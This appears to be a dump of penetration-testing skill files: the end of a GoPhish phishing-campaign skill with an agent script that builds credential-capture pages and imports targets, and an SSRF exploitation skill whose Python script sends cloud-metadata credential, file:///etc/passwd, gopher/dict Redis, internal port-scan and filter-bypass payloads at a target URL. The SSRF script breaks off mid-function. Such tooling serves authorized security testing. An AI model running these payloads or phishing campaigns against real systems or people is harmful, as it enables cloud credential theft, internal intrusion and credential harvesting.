api = Gophish("api_key", host="https://localhost:3333", verify=False)  # Self-signed cert on localhost lab
campaign = Campaign(name="Q1 Test", groups=[Group(name="Sales Team")],
    template=Template(name="IT Password Reset"), smtp=SMTP(name="Internal SMTP"),
    page=Page(name="Credential Page"))
api.campaigns.post(campaign)
```

===== END FILE =====


===== FILE: skills/performing-red-team-phishing-with-gophish/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-red-team-phishing-with-gophish/references/api-reference.md =====
# API Reference: GoPhish Phishing Simulation

## Python gophish Library

### Constructor
```python
from gophish import Gophish
api = Gophish(api_key, host="https://localhost:3333", verify=False)
```

### Campaigns
```python
api.campaigns.get()                    # List all campaigns
api.campaigns.get(campaign_id=1)       # Get specific campaign
api.campaigns.post(campaign)           # Create and launch campaign
api.campaigns.summary(campaign_id=1)   # Get campaign summary
api.campaigns.delete(campaign_id=1)    # Delete campaign
```

### Templates
```python
api.templates.get()                    # List templates
api.templates.post(template)           # Create template
Template(name="...", subject="...", html="<html>...</html>", text="...")
```

### Groups
```python
api.groups.get()                       # List groups
api.groups.post(group)                 # Create group
Group(name="...", targets=[User(first_name="", last_name="", email="")])
```

### SMTP Profiles
```python
api.smtp.get()
api.smtp.post(smtp)
SMTP(name="...", from_address="...", host="smtp:587", username="", password="")
```

### Landing Pages
```python
api.pages.get()
api.pages.post(page)
Page(name="...", html="...", capture_credentials=True, redirect_url="")
```

## Campaign Model
```python
Campaign(
    name="Q1 Test",
    template=Template(name="Existing Template"),
    page=Page(name="Existing Page"),
    smtp=SMTP(name="Existing Profile"),
    groups=[Group(name="Existing Group")],
    url="https://phish.example.com",
    launch_date="2024-01-15T09:00:00+00:00"  # ISO8601
)
```

## Result Statuses
| Status | Meaning |
|--------|---------|
| Email Sent | Email delivered |
| Email Opened | Tracking pixel loaded |
| Clicked Link | Phishing URL clicked |
| Submitted Data | Credentials entered |
| Reported | User reported phishing |

===== END FILE =====


===== FILE: skills/performing-red-team-phishing-with-gophish/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""GoPhish Campaign Agent - Automates phishing simulation setup, launch, and analysis."""

import json
import csv
import logging
import argparse
from datetime import datetime

from gophish import Gophish
from gophish.models import Campaign, Template, Group, SMTP, Page, User

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def connect_gophish(api_key, host):
    """Connect to GoPhish server via API."""
    api = Gophish(api_key, host=host, verify=False)
    logger.info("Connected to GoPhish at %s", host)
    return api


def create_email_template(api, name, subject, html_body, text_body=""):
    """Create an email template in GoPhish."""
    template = Template(name=name, subject=subject, html=html_body, text=text_body)
    result = api.templates.post(template)
    logger.info("Created template: %s (ID: %d)", result.name, result.id)
    return result


def create_landing_page(api, name, html_content, capture_credentials=True, redirect_url=""):
    """Create a landing page for credential capture."""
    page = Page(
        name=name,
        html=html_content,
        capture_credentials=capture_credentials,
        redirect_url=redirect_url,
    )
    result = api.pages.post(page)
    logger.info("Created landing page: %s (ID: %d)", result.name, result.id)
    return result


def create_smtp_profile(api, name, smtp_from, host, port=587, username="", password="", ignore_cert=False):
    """Create an SMTP sending profile."""
    smtp = SMTP(
        name=name,
        from_address=smtp_from,
        host=f"{host}:{port}",
        username=username,
        password=password,
        ignore_cert_errors=ignore_cert,
    )
    result = api.smtp.post(smtp)
    logger.info("Created SMTP profile: %s (ID: %d)", result.name, result.id)
    return result


def import_targets_from_csv(api, group_name, csv_path):
    """Import target users from a CSV file into a GoPhish group."""
    targets = []
    with open(csv_path, "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            targets.append(User(
                first_name=row.get("first_name", ""),
                last_name=row.get("last_name", ""),
                email=row.get("email", ""),
                position=row.get("position", ""),
            ))
    group = Group(name=group_name, targets=targets)
    result = api.groups.post(group)
    logger.info("Created group '%s' with %d targets", group_name, len(targets))
    return result


def launch_campaign(api, name, template_name, page_name, smtp_name, group_name, url):
    """Launch a phishing simulation campaign."""
    campaign = Campaign(
        name=name,
        template=Template(name=template_name),
        page=Page(name=page_name),
        smtp=SMTP(name=smtp_name),
        groups=[Group(name=group_name)],
        url=url,
    )
    result = api.campaigns.post(campaign)
    logger.info("Launched campaign: %s (ID: %d)", result.name, result.id)
    return result


def get_campaign_results(api, campaign_id):
    """Retrieve detailed results for a campaign."""
    campaign = api.campaigns.get(campaign_id=campaign_id)
    results = {
        "name": campaign.name,
        "status": campaign.status,
        "created_date": str(campaign.created_date),
        "launch_date": str(campaign.launch_date),
        "results": [],
    }
    for result in campaign.results:
        results["results"].append({
            "email": result.email,
            "first_name": result.first_name,
            "last_name": result.last_name,
            "status": result.status,
            "reported": result.reported,
        })
    return results


def analyze_campaign_metrics(campaign_results):
    """Calculate campaign performance metrics."""
    results = campaign_results.get("results", [])
    total = len(results)
    if total == 0:
        return {"total": 0}
    statuses = {"Email Sent": 0, "Email Opened": 0, "Clicked Link": 0, "Submitted Data": 0, "Reported": 0}
    for r in results:
        status = r.get("status", "")
        if status in statuses:
            statuses[status] += 1
        if r.get("reported"):
            statuses["Reported"] += 1
    metrics = {
        "total_targets": total,
        "emails_sent": statuses["Email Sent"],
        "opened": statuses["Email Opened"],
        "clicked": statuses["Clicked Link"],
        "submitted_credentials": statuses["Submitted Data"],
        "reported": statuses["Reported"],
        "open_rate": round(statuses["Email Opened"] / total * 100, 1),
        "click_rate": round(statuses["Clicked Link"] / total * 100, 1),
        "submission_rate": round(statuses["Submitted Data"] / total * 100, 1),
        "report_rate": round(statuses["Reported"] / total * 100, 1),
    }
    logger.info("Campaign metrics: %d targets, %.1f%% clicked, %.1f%% submitted",
                total, metrics["click_rate"], metrics["submission_rate"])
    return metrics


def list_campaigns(api):
    """List all campaigns and their statuses."""
    campaigns = api.campaigns.get()
    return [{"id": c.id, "name": c.name, "status": c.status} for c in campaigns]


def generate_report(campaign_results, metrics):
    """Generate phishing simulation report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "campaign": campaign_results.get("name"),
        "status": campaign_results.get("status"),
        "metrics": metrics,
        "detailed_results": campaign_results.get("results", [])[:50],
    }
    print(f"PHISHING REPORT: {metrics.get('total_targets', 0)} targets, "
          f"{metrics.get('click_rate', 0)}% click rate, "
          f"{metrics.get('submission_rate', 0)}% credential submission")
    return report


def main():
    parser = argparse.ArgumentParser(description="GoPhish Campaign Agent")
    parser.add_argument("--gophish-url", required=True, help="GoPhish server URL")
    parser.add_argument("--api-key", required=True, help="GoPhish API key")
    parser.add_argument("--campaign-id", type=int, help="Existing campaign ID to analyze")
    parser.add_argument("--campaign-name", help="Name for new campaign")
    parser.add_argument("--template-name", help="Email template name")
    parser.add_argument("--group-name", help="Target group name")
    parser.add_argument("--targets-csv", help="CSV file with targets")
    parser.add_argument("--output", default="phishing_report.json")
    args = parser.parse_args()

    api = connect_gophish(args.api_key, args.gophish_url)

    if args.targets_csv and args.group_name:
        import_targets_from_csv(api, args.group_name, args.targets_csv)

    if args.campaign_id:
        results = get_campaign_results(api, args.campaign_id)
        metrics = analyze_campaign_metrics(results)
        report = generate_report(results, metrics)
    else:
        campaigns = list_campaigns(api)
        report = {"campaigns": campaigns, "timestamp": datetime.utcnow().isoformat()}
        logger.info("Listed %d campaigns", len(campaigns))

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-ssrf-vulnerability-exploitation/SKILL.md =====
---
name: performing-ssrf-vulnerability-exploitation
description: >-
  Tests web application URL parameters for Server-Side Request Forgery by
  probing cloud metadata endpoints (AWS/GCP/Azure at 169.254.169.254),
  internal network services, and protocol handlers (file://, gopher://,
  dict://) using a Python script, including IP-encoding bypass and DNS
  rebinding checks. Use during authorized penetration testing to confirm SSRF
  in a URL-fetching parameter and generate a vulnerability report.
domain: cybersecurity
subdomain: security-operations
tags:
- ssrf
- web-application-security
- cloud-metadata-abuse
- vulnerability-exploitation
- penetration-testing
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1078.004
- T1530
---


## When to Use

- When conducting security assessments that involve performing ssrf vulnerability exploitation
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install requests`
2. Identify URL parameters in the target application that accept URLs or hostnames.
3. Test SSRF payloads:
   - Cloud metadata: `http://169.254.169.254/latest/meta-data/`
   - Internal services: `http://127.0.0.1:port/`, `http://10.0.0.1/`
   - Protocol handlers: `file:///etc/passwd`, `gopher://`, `dict://`
   - Bypass techniques: IP encoding, DNS rebinding, URL redirects
4. Analyze responses for information disclosure or internal access confirmation.
5. Generate a vulnerability assessment report.

```bash
# For authorized penetration testing and lab environments only
python scripts/agent.py --target-url https://app.example.com/fetch?url= --output ssrf_report.json
```

## Examples

### AWS Metadata SSRF
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
If the response contains AWS credentials (AccessKeyId, SecretAccessKey), SSRF is confirmed with critical impact.

===== END FILE =====


===== FILE: skills/performing-ssrf-vulnerability-exploitation/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-ssrf-vulnerability-exploitation/references/api-reference.md =====
# API Reference: SSRF Vulnerability Testing

## Cloud Metadata Endpoints
| Cloud | URL | Headers |
|-------|-----|---------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | None |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` | `X-aws-ec2-metadata-token-ttl-seconds: 21600` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |

## IP Encoding Bypass Techniques
| Technique | 169.254.169.254 Encoded |
|-----------|------------------------|
| Decimal | `2852039166` |
| Hex | `0xa9fea9fe` |
| Octal | `0251.0376.0251.0376` |
| IPv6 mapped | `[::ffff:169.254.169.254]` |
| Shortened | `169.254.169.254` -> `0` (localhost) |

## Python requests
```python
import requests
resp = requests.get(url, timeout=10, allow_redirects=False, verify=False)
resp.status_code   # HTTP status
resp.text          # Response body
len(resp.content)  # Response size
resp.headers       # Response headers
```

## SSRF Impact Levels
| Access | Impact | Severity |
|--------|--------|----------|
| Cloud metadata credentials | Full account compromise | Critical |
| Internal service access | Lateral movement | High |
| Local file read (file://) | Information disclosure | High |
| Internal port scan | Reconnaissance | Medium |

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1552.005 - Cloud Instance Metadata API

===== END FILE =====


===== FILE: skills/performing-ssrf-vulnerability-exploitation/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""SSRF Vulnerability Testing Agent - Tests for Server-Side Request Forgery via URL parameters."""

import json
import logging
import argparse
from datetime import datetime

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

METADATA_PAYLOADS = [
    {"name": "AWS IMDSv1 metadata", "url": "http://169.254.169.254/latest/meta-data/", "indicator": "ami-id"},
    {"name": "AWS IAM credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "indicator": "AccessKeyId"},
    {"name": "AWS user-data", "url": "http://169.254.169.254/latest/user-data", "indicator": ""},
    {"name": "GCP metadata", "url": "http://metadata.google.internal/computeMetadata/v1/", "indicator": "attributes"},
    {"name": "GCP service account token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "indicator": "access_token"},
    {"name": "Azure IMDS", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "indicator": "compute"},
    {"name": "Azure managed identity", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "indicator": "access_token"},
]

INTERNAL_SCAN_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

BYPASS_PAYLOADS = [
    {"name": "Decimal IP", "url": "http://2852039166/latest/meta-data/"},
    {"name": "Hex IP", "url": "http://0xa9fea9fe/latest/meta-data/"},
    {"name": "Octal IP", "url": "http://0251.0376.0251.0376/latest/meta-data/"},
    {"name": "IPv6 mapped", "url": "http://[::ffff:169.254.169.254]/latest/meta-data/"},
    {"name": "Short URL localhost", "url": "http://0/"},
    {"name": "Redirect bypass", "url": "http://spoofed.burpcollaborator.net/redirect?url=http://169.254.169.254/"},
    {"name": "DNS rebinding", "url": "http://a]@169.254.169.254/latest/meta-data/"},
]


def test_ssrf_payload(target_url, ssrf_payload, timeout=10):
    """Send an SSRF payload through the target URL parameter."""
    test_url = f"{target_url}{ssrf_payload}"
    try:
        resp = requests.get(test_url, timeout=timeout, allow_redirects=False, verify=False)
        return {
            "status_code": resp.status_code,
            "response_length": len(resp.content),
            "response_preview": resp.text[:500],
            "headers": dict(resp.headers),
        }
    except requests.RequestException as e:
        return {"error": str(e)}


def test_metadata_endpoints(target_url):
    """Test cloud metadata SSRF payloads."""
    findings = []
    for payload in METADATA_PAYLOADS:
        result = test_ssrf_payload(target_url, payload["url"])
        vulnerable = False
        if "error" not in result:
            if result["status_code"] == 200 and result["response_length"] > 10:
                if payload["indicator"] and payload["indicator"] in result.get("response_preview", ""):
                    vulnerable = True
                elif not payload["indicator"] and result["response_length"] > 50:
                    vulnerable = True
        findings.append({
            "test": payload["name"],
            "payload": payload["url"],
            "vulnerable": vulnerable,
            "severity": "critical" if vulnerable else "info",
            "response_status": result.get("status_code"),
            "response_length": result.get("response_length", 0),
        })
        if vulnerable:
            logger.warning("SSRF confirmed: %s", payload["name"])
    return findings


def test_internal_port_scan(target_url, internal_ip="127.0.0.1"):
    """Use SSRF to scan internal ports."""
    open_ports = []
    for port in INTERNAL_SCAN_PORTS:
        payload = f"http://{internal_ip}:{port}/"
        result = test_ssrf_payload(target_url, payload, timeout=5)
        if "error" not in result and result["status_code"] != 502:
            open_ports.append({
                "ip": internal_ip,
                "port": port,
                "status": result["status_code"],
                "response_length": result["response_length"],
            })
            logger.info("Internal port open: %s:%d (status: %d)", internal_ip, port, result["status_code"])
    return open_ports


def test_bypass_techniques(target_url):
    """Test SSRF filter bypass techniques."""
    bypass_results = []
    for payload in BYPASS_PAYLOADS:
        result = test_ssrf_payload(target_url, payload["url"], timeout=5)
        success = "error" not in result and result.get("status_code") == 200 and result.get("response_length", 0) > 10
        bypass_results.append({
            "technique": payload["name"],
            "payload": payload["url"],
            "bypassed": success,
            "severity": "high" if success else "info",
        })
        if success:
            logger.warning("SSRF bypass succeeded: %s", payload["name"])
    return bypass_results


def test_protocol_handlers(target_url):
    """Test non-HTTP protocol handlers for SSRF."""
    protocols = [
        {"name": "file:// protocol", "url": "file:///etc/passwd", "indicator": "root:"},
        {"name": "gopher:// protocol", "url": "gopher://127.0.0.1:6379/_INFO", "indicator": "redis"},
        {"name": "dict:// protocol", "url": "dict://127.0.0.1:6379/INFO", "indicator": "redis"},
    ]
    results = []
    for proto in protocols:
        result = test_ssrf_payload(target_url, proto["url"], timeout=5)
        vulnerable = (
            "error" not in result
            and result.get("status_code") == 200
            and proto["indicator"] in result.get("response_preview", "")
        )
        results.append({
            "protocol": proto["name"],
            "payload": proto["url"],
            "vulnerable": vulnerable,
            "severity": "critical" if vulnerable else "info",
        })
    return results


def generate_report(metadata_findings, port_scan, bypass_results, protocol_results):
    """Generate SSRF assessment report."""
    critical = (
        [f for f in metadata_findings if f["vulnerable"]]
        + [b for b in bypass_results if b["bypassed"]]
        + [p for p in protocol_results if p["vulnerable"]]
    )
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "metadata_tests": metadata_findings,
